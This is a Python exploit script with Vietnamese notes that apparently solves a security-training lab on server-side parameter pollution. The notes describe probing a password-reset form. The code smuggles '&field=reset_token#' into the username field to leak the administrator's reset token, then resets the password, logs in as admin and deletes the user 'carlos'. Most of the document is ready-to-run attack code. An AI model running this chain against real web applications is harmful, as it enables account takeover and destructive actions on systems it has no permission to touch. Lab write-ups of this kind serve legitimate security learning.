"""
Phân tích lab4: 
Yêu cầu: Đăng nhập với tài khoản administrator và xóa người dùng carlos

Khác với lab1,2,3 ta ko thể truy cập trực tiếp api nội bộ từ phía người dùng
Do đó sau khi lướt qua web , tôi thấy tại trang /forgot-password ta có thể làm ô nhiễm phía máy chủ từ đó máy chủ gửi dữ liệu đến api làm lộ thông tin nhạy cảm
Thử chèn &1=1 và cuối thấy xảy ra lỗi "Parameter is not supported" => api nội bộ hiểu đây là tham số riêng biệt thay vì là chuỗi tên
Thử chèn %23 vào cuối (username="administrator%23") => xảy ra lỗi "field not specified" => điều này cho thấy ứng dụng có thể có tham sô bổ sung Field
Thử chẻn %26field=x vào cuối => xảy ra lỗi "Invalid field" => ứng dụng có sử dụng tham số field
Brute forece trường Field bằng payload lấy từ "https://github.com/antichown/burp-payloads/blob/master/Server-side%20variable%20names.pay" có thể lấy ra được 2 tham số hợp lệ là email và username
* Điều này ta đã có thể thấy trực tiếp khi post request đến trang

Đọc mã nguồn ta thấy có đường dẫn nhạy cảm "/static/js/forgotPassword.js" => Đoạn cuối mã có đề cập đến tham số reset_token (đây là cái ta đang cần tìm)
Code minh họa bên dưới
"""

import requests
from bs4 import BeautifulSoup
import json

import requests
from bs4 import BeautifulSoup

url = 'YOUR_URL'

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded'
}

print("=== Lấy CSRF cho Forgot Password ===")
res_csrf = requests.get(url + "/forgot-password", headers=headers)
soup = BeautifulSoup(res_csrf.text, 'html.parser')
session_forgot = res_csrf.cookies.get("session")
csrf_forgot = soup.find('input', {'name': 'csrf'})['value']
print(f"[+] CSRF: {csrf_forgot}")
print(f"[+] Session: {session_forgot}")

print("=== Tạo reset_token ===")
res_created_reset_token = requests.post(url + "/forgot-password", data=f"csrf={csrf_forgot}&username=administrator", headers=headers, cookies={"session": session_forgot}, allow_redirects=False)

print("=== Tiến hành lấy reset_token ===")
payload = {
    "csrf": csrf_forgot,
    "username": "administrator&field=reset_token#" 
}

res_reset = requests.post(url + "/forgot-password", data=payload, headers=headers, cookies={"session": session_forgot})
try:
    reset_token = res_reset.json().get("result")
    if not reset_token:
        print("[-] Không tìm thấy token trong JSON. Phản hồi server:", res_reset.text)
        exit()
    print(f"[+] Reset token tìm thấy: {reset_token}")
except Exception as e:
    print(f"[-] Lỗi khi parse JSON: {e}")
    exit()

print("=== Đổi mật khẩu administrator thành '123' ===")
res_csrf_forgot_change = requests.get(url + f"/forgot-password?reset-token={reset_token}", headers=headers, cookies={"session": session_forgot})
soup_csrf_forgot_change = BeautifulSoup(res_csrf_forgot_change.text, 'html.parser')
csrf_forgot_change = soup_csrf_forgot_change.find('input', {'name': 'csrf'})['value']
print(f"[+] CSRF: {csrf_forgot_change}")
data_change = {
    "csrf": csrf_forgot_change,
    "reset_token": reset_token,
    "new-password-1": "123",
    "new-password-2": "123"
}
res_change_password=requests.post(url + f"/forgot-password?reset-token={reset_token}", data=data_change, headers=headers, cookies={"session": session_forgot})
print(res_change_password.status_code)
print(res_change_password.text)

print("=== Đăng nhập admin ===")
res_csrf_login = requests.get(url + "/login", headers=headers)
soup_login = BeautifulSoup(res_csrf_login.text, 'html.parser')
session_login = res_csrf_login.cookies.get("session")
csrf_login = soup_login.find('input', {'name': 'csrf'})['value']
print(f"[+] CSRF: {csrf_login}")
print(f"[+] Session admin: {session_login}")

data_login = {
    "csrf": csrf_login,
    "username": "administrator",
    "password": "123"
}
res_login = requests.post(url + "/login", data=data_login, headers=headers,cookies={"session": session_login}, allow_redirects=False)
session_admin = res_login.cookies.get("session")
print(f"[+] Session admin: {session_admin}")

print("=== Xóa người dùng carlos ===")
res_delete = requests.get(url + "/admin/delete?username=carlos", headers=headers, cookies={"session": session_admin})

if res_delete.status_code == 200 or "User deleted successfully" in res_delete.text:
    print("[🎉] Lab Solved: Đã xóa Carlos!")
else:
    print("[!] Thất bại khi xóa Carlos. Status code:", res_delete.status_code)